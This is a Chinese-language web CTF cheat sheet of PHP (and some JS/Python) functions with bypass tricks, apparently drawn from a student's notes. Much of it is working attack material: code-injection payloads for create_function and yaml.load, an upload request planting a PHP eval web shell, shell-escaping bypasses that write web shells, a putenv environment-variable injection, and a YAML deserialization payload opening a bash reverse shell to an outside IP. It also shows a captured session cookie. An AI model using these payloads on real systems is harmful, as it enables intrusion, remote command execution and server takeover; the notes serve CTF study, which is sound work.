# Web CTF Notes — PHP 函数速查

> 来源：source/本科web笔记.md
> 内容按原笔记保留，仅添加本分组标题。

## 二十六、PHP 函数速查

## 📖 二十六、PHP 函数速查

> [!summary] 速览
> - 32 个常考函数速查，重点：`basename()`、`create_function()`、`end()`、`include()`、`intval()`、`parse_str()`、`parse_url()`、`yaml.load()`
> - 每个函数都记「怎么绕过」而不是「是什么」，例如 `array_search()` 用 `test[]=0`、`is_number()` 用 `0x` 前缀
> - 下方为函数索引表，点名称可直接跳转

**函数索引**（点名称跳转）

| 函数 | 关键点 | 跳转 |
| --- | --- | --- |
| `array_search()` | `test[]=0` 绕过（数组与 0 松散比较） | [[#array_search()]] |
| `assert()` | 字符串参数会被当 PHP 代码执行，可读系统文件 | [[#assert()]] |
| `basename()` | 不可见字符（汉字、？、《、》）能绕过正则又被 basename 忽略 | [[#basename()]] |
| `create_function()` | 匿名函数名是 `\000lambda_N`，闭合 `{}` 就能执行代码 | [[#create_function()]] |
| `call_user_func()` | `ctfshow[0]=ctfshow&ctfshow[1]=getFlag`，前面类后面方法 | [[#call_user_func()]] |
| `end()` | 取数组末元素，多文件上传时可用它绕过后缀检查 | [[#end()]] |
| `Data()（date 格式化字符）` | `d` 天 / `m` 月 / `Y` 年 / `H` 小时 / `i` 分钟 | [[#Data()（date 格式化字符）]] |
| `date() 转义` | 反斜线转义可拼出 `/flag` | [[#date() 转义]] |
| `escapeshellcmd()` | 在 `*` `&` `#` `;` `\` 等特殊字符前插反斜线；单双引号不配对时才转义 | [[#escapeshellcmd()]] |
| `escapeshellarg() + escapeshellcmd()` | 两者叠加可被 `\` 绕过，命令被拼成 `curl 172.17.0.2\ -v -d a=1'` | [[#escapeshellarg() + escapeshellcmd()]] |
| `exit()` | 死亡 exit：配合 filter 链把代码写进目标文件 | [[#exit()]] |
| `file_get_contents()` | 配合伪协议 `data://text/plain,...` 读内容 | [[#file_get_contents()]] |
| `file_put_contents()` | 内容可控时用 `?>` 闭合写马，Payload `?><?=`nl%09/*`` | [[#file_put_contents()]] |
| `$_FILES['file']['type']` | 改 MIME 类型即可绕过 | （见下文） |
| `getip()` | `Client-IP` 请求头可控 | [[#getip()]] |
| `include()` | 伪协议读文件 / PEAR 装马 / session 包含 / 截断与 opcache 缓存 | [[#include()]] |
| `intval()` | `if(intval($a))` 用数组 `a[]` 绕过 | [[#intval()]] |
| `is_number()` | 是数字返回 1；配 `Math.random()` 时用 z3 解 | [[#is_number()]] |
| `pathinfo()` | 返回 `dirname` / `basename` / `extension` / `filename` 四个键 | [[#pathinfo()]] |
| `putenv()` | `[BASH_FUNC_echo%%]=() { cat /f*; }` 注入环境变量绕过 | [[#putenv()]] |
| `parse_str()` | 造成变量覆盖：`_POST[key1]=36d` 等价于用 POST 传 `key1=36d` | [[#parse_str()]] |
| `parse_url()` | `host` 遇 `:` `/` 会截断；配反引号写文件；多重变量覆盖 `host=>user,user=>pass` | [[#parse_url()]] |
| `require_once()` | 软链接层数太多会让 once 的 hash 匹配失效，造成重复包含 | [[#require_once()]] |
| `strpos()` | 伪协议里塞不认识的关键字（如 `woofers/`）可绕过匹配 | [[#strpos()]] |
| `toLowerCase()` | `K`.toLowerCase() == `k` | [[#toLowerCase()]] |
| `toUpperCase()` | `ı` → `I`、`ſ` → `S`，用来绕过限制 | [[#toUpperCase()]] |
| `yaml.load()` | `!!js/function` / `!!python/object/new` 反序列化 RCE | [[#yaml.load()]] |
| `$_REQUEST` | 同时接收 GET 与 POST，且 POST 优先，可用来绕过 | （见下文） |
| `$_SERVER['QUERY_STRING']` | 用 URL 编码绕过 | （见下文） |
| `toUpperCase()（补充）` | 同上：`ı`、`ſ` 转大写得到 `I`、`S` | [[#toUpperCase()（补充）]] |
| `toLowerCase()（补充）` | `K` 转小写得到 `k`（注意这个 K 不是 K） | [[#toLowerCase()（补充）]] |
| `fastcgi_pass` | 用 Gopher 打 fastcgi | [[#fastcgi_pass]] |

### array_search()

test[]=0绕过

### assert()

assert函数能够将字符串参数当作php代码来执行 因此，可以通过assert函数来读取服务器系统文件内容

![](image-20240128143440443%201.png)

### basename()

例题一：

![](image-20240126195031387%201.png)

会误以为config.php是当前目录

加了过滤

![](image-20240126200232618%201.png)

**不可见字符绕过正则的同时而且会被basename忽略掉**

例如：**汉字、？、《、》、；**

(basename漏洞)[https://blog.csdn.net/qq_54929891/article/details/123662382?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-3-123662382-blog-125192049.235%5Ev43%5Epc_blog_bottom_relevance_base5&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-3-123662382-blog-125192049.235%5Ev43%5Epc_blog_bottom_relevance_base5&utm_relevant_index=6]

### create_function()

 $nss_shell = create_function($shell,$nss);

shell=){}system('cat /f*');//&nss=123

参数可控：};system(\$_POST[1]);//

匿名函数在使用后名称是\000lambda_1，每次使用都会加1，这样构造d0g3使匿名函数闭合，执行

其他函数，name为\000lambda_+payload⻓度，即可进入执行命令

普通上传会吃掉\000

```python
import  requests

req  =  requests.session()

with  open('1.txt','a+')  as  f:

  for  i  in  range(1,33):

​    str  =  "\000"

​    payload  =  """?d0g3=11111include'"]);}phpinfo();/*&name="""

​    payload  =  payload  +  str+'lambda_30'

​    res=req.get("http://47.108.206.43:36321"+payload)

​    print(res.text,file=f)

```

### call_user_func()

ctfshow=ctfshow::getFlag  前面类后面方法

ctfshow[0]=ctfshow&ctfshow[1]=getFlag  #POST

phpinfo

### end()

https://www.anquanke.com/post/id/164561

有传入参数漏洞

```php
$ext = end(($file));
    if (!in_array($ext,['jpg','png','gif'])){
        die('This file is not allowed!');
    }
    $filename = reset($file).'.' .$file[count($file)-1];
    if(move_uploaded_file($_FILES['file']['tmp_name'],$sandbox.'/'.$filename)){
        echo 'Success!';
        echo 'filepath:' . $sandbox . '/' . $filename;
    }else{
        echo 'Failed!';
    }

```

![](image-20240303141511140%201.png)

```php
POST / HTTP/1.1
Host: mao.ctf.homes:32778
Content-Length: 1972
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://mao.ctf.homes:32778
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjneoAU5lmyR3AEAU
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mao.ctf.homes:32778/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: GZCTF_Token=CfDJ8KTVQ-0YY1tLhd2VR2LVgdF0X-ydfWhO_vgcXdzEUx8X_Bti64XnOWc5OCx18oE6y0th7Y0vRptWmyYBQWNSnFkPz2cWciyupIXKq8RdpmKZhwehfRVP-4pIpgZjPptbxJsNMLaa16pRcJmStKFgnjh2rRRPA31eii0pi8e87BosCvjRRoIcKsdhxUNhHHbo1txU8dYUGb5uBnM8f3mtcKAAdIOqikn9LA74j2sg35q11_g2ScgVINc5to9FY-8Dx4bCoFkbCGIzGYrR7zjqBh-XRMBcf_7fkzAg-gkBnsZ4sc6RJa5ZECBtZFzmBj7j5Z7JV4vq1IgUf5yMYaUm8lVWOaaUKVe14QERYPIGm0ol35JMsUEuvMNhHASbTA9xIFYg6Xe0FhN9WGpELR4tquRKSXO__xPyrj6rQr7u_fUA7USa0_-sM8eiTn5vH4iUNSEYxcCS9qeprGe4GuHbxO3D5OHJJUlk4TBdnrEE1O7C8IecQnVmOHIs5RVGY1OfOVA3bLncN8ptszACqyDxweLqn0Vttxf747m_dgbUGkfKk2idhQLAh7d0eSpapYzw6n-7qTdYQuRdM7CBFsDw57VI9f9ZUxt78XIlvx0Nt_zNlQFBn6uimX_DNVL-nu8OYkmJBH9HitXqzgD_Ae40afsfoYertlLSzzqUSD4HDK0__hkxbHkZsIVicyHRL4U4J4dIRWLWXiyzzFRtRGP5PrfHDEPPbR4YIlkQvEAEHknX
Connection: close

------WebKitFormBoundaryjneoAU5lmyR3AEAU
Content-Disposition: form-data; name="filename[1]"

php
------WebKitFormBoundaryjneoAU5lmyR3AEAU
Content-Disposition: form-data; name="filename[0]"

png
------WebKitFormBoundaryjneoAU5lmyR3AEAU
Content-Disposition: form-data; name="file"; filename="10.jpg"
Content-Type: image/jpeg

ÿØÿà
<?php eval($_POST['cd']);?>

------WebKitFormBoundaryjneoAU5lmyR3AEAU--

```

### Data()（date 格式化字符）

- d - 代表月中的天 (01 - 31)
- m - 代表月 (01 - 12)
- Y - 代表年 (四位数)
- H - 小时 00-23
- i ——分钟数

### date() 转义

注意date函数可以进行转义 把/f\l\a\g转化为/flag

### escapeshellcmd()

反斜线（\）会在以下字符之前插入： *&#;`|\*?~<>^()[]{}$*, *\x0A* 和 *\xFF*。 *’* 和 *“* 仅在不配对儿的时候被转义。

### escapeshellarg() + escapeshellcmd()

传入的参数是：172.17.0.2' -v -d a=1经过escapeshellarg处理后变成了'172.17.0.2'\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。

样例：' <?= @eval($_POST["pd"]);?> -oG pd.phtml '

### exit()

https://xiaolong22333.top/index.php/archives/114/

### file_get_contents()

-->php伪协议-->data://text/plain,I have a dream-->

### file_put_contents()

<?php$dir = "/path/to/directory/"; // 替换为要保存文件的目录路径$code = "echo 'Hello, World!';"; // 替换为要写入文件的 PHP 代码$fuxkfile = " // additional content"; // 替换为要写入文件的额外内容

file_put_contents($dir . "index.php", "<?php ".$code.$fuxkfile);?>

例题里面的fuckfile为?>闭合

Payload=?><?=`nl%09/*`

### $_FILES['file']['type']

修改mime类型可绕过

```php
 if(!in_array($_FILES['file']['type'],['image/jpeg','image/png','image/gif'])){
        die('This type is not allowed!');
    }

```

### getip()

Client-ip控制

### include()

php伪协议读取-->pear文件包含-->session文件包含

· [伪协议读文件二次URL编码](#wei-xie-yi-du-wen-jian-er-ci-url-bian-ma)

· [打opcache缓存](#da-opcache-huan-cun)

· [包含pearcmd装马](#bao-han-pearcmd-zhuang-ma)

· [靶机可以出网](#ba-ji-ke-yi-chu-wang)

· [靶机不能出网](#ba-ji-bu-neng-chu-wang)

· [绕过包含次数限制](#rao-guo-bao-han-ci-shu-xian-zhi)

· [include2shell](#include2shell)

· [compress.zlib生成临时文件](#compress-zlib-sheng-cheng-lin-shi-wen-jian)

· [包含nginx临时文件](#bao-han-nginx-lin-shi-wen-jian)

（123123)[https://blog.csdn.net/m0_46467017/article/details/126380415]

```php
<?php
	$path=$_GET['path'];
	include($path . '/phpinfo.php');
?>

```

包含自己的就可以

如果php版本小于5.3.4，我们可以尝试使用%00截断，这里php版本为7.3.4，不适用。

还有一种截断方法就是?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数，成功读取test.php如下：

### intval()

If(intval($a))-->数组a[]绕过

### is_number()

是数字返回1

Math.random()

```python
#!/usr/bin/python3
import z3,struct,sys
sequence = [0.6199046082820001, 0.6623637813965961, 0.7190181683749095, 0.06169296721449724, 0.915799780594273]
sequence = sequence[::-1]
solver = z3.Solver()
se_state0, se_state1 = z3.BitVecs("se_state0 se_state1", 64)
for i in range(len(sequence)):
    se_s1 = se_state0
    se_s0 = se_state1
    se_state0 = se_s0
    se_s1 ^= se_s1 << 23
    se_s1 ^= z3.LShR(se_s1, 17)
    se_s1 ^= se_s0
    se_s1 ^= z3.LShR(se_s0, 26)
    se_state1 = se_s1
    float_64 = struct.pack("d", sequence[i] + 1)
    u_long_long_64 = struct.unpack("<Q", float_64)[0]
    mantissa = u_long_long_64 & ((1 << 52) - 1)
    solver.add(int(mantissa) == z3.LShR(se_state0, 12))
if solver.check() == z3.sat:
    model = solver.model()
    states = {}
    for state in model.decls():
        states[state.__str__()] = model[state]
    state0 = states["se_state0"].as_long()
    u_long_long_64 = (state0 >> 12) | 0x3FF0000000000000
    float_64 = struct.pack("<Q", u_long_long_64)
    next_sequence = struct.unpack("d", float_64)[0]
    next_sequence -= 1
    print(next_sequence)
```

### pathinfo()

- 你可以通过以下方式访问 `pathinfo()` 返回的关联数组中的不同信息：

  - `$info['dirname']`：返回文件所在目录的路径。
  - `$info['basename']`：返回文件的完整基本名称（包含文件名和扩展名）。
  - `$info['extension']`：返回文件的扩展名。
  - `$info['filename']`：返回文件的名称（不包含扩展名）。

### putenv()

![](image-20240216143935360%201.png)

`[BASH_FUNC_echo%25%25]=()%20{%20cat /f*;%20}`

https://cloud.tencent.com/developer/article/2354373

直接连

![](image-20240216143952461%201.png)

### parse_str()

parse_str函数造成变量覆盖

GET方法传参_POST[key1]=36d

parse_str()将字符串解析到POST数组中，数组此时就有了一个键值对

此时，效果上相当于以POST方法传参 key1=36d

### parse_url()

parse_url这个函数，这个函数主要就是将一个url链接进行分解，例如http://baidu.com/aaa/bbb

例题一：

![](image-20240121124354296%201.png)

例题二：

host遇到:和/会截断

![](image-20240121125514276%201.png)

其中host是baidu.com path是/aaa/bbb 注意这里的path是含有/的，host是不能有/的，所以返回根目录用cd

所以例如传入http://`ls`/a.php,分解开就是 echo `ls`> /a.php，会写如到根目录下，不方便访问。

因此要想办法写入到当前目录，这里构造语句将前面提前闭合即可。http://1/1;echo `ls` >t.txt (注意这里用反引号，不用system，因为system是php函数，这里设shell_exec里，用反引号来代表命令替换)assert也可

例题三：多重变量

![](image-20240121132140552%201.png)

<details>

<summary>点击展开</summary>

![](image-20240121132221796%201.png)

</details>

host=>user,user=>pass,pass=>query以此类推便可以实现变量覆盖了

### require_once()

```text
require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含

```

```text
?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php

```

![](image-20240223192255615%201.png)

### strpos()

//匹配到即可 php://filter/read=convert.base64-encode/woofers/resource=flag这里伪协议的协议中都指定了特定的协议键，识别到woofers时不认识会忽略掉，但这道题却能够绕过strpos函数

### toLowerCase()

这个"K"的“小写”字符是k，也就是"K".toLowerCase() == 'k'.

### toUpperCase()

这两个字符的“大写”是I和S。也就是说"ı".toUpperCase() == 'I'，"ſ".toUpperCase() == 'S'。通过这个小特性可以绕过一些限制。

### yaml.load()

`"name" : { toString: !!js/function "function(){ flag = process.mainModule.require('child_process').execSync('cat /fla*').toString(); return flag;}"}`

```text
!!python/object/new:str
    args: []
    state: !!python/tuple
      - "__import__('os').system('bash -c \"bash -i >& /dev/tcp/47.99.125.16/3389 <&1\"')"
      - !!python/object/new:staticmethod
        args: []
        state:
          update: !!python/name:eval
          items: !!python/name:list

```

### $_REQUEST

同时接受post和get，但优先接受post可以进行绕过

### $_SERVER['QUERY_STRING']

用url编码绕过

### toUpperCase()（补充）
字符"ı"、"ſ" 经过toUpperCase处理后结果为 "I"、"S"
### toLowerCase()（补充）

字符"K"经过toLowerCase处理后结果为"k"(这个K不是K)

### fastcgi_pass

Gopher打fastcgi

---

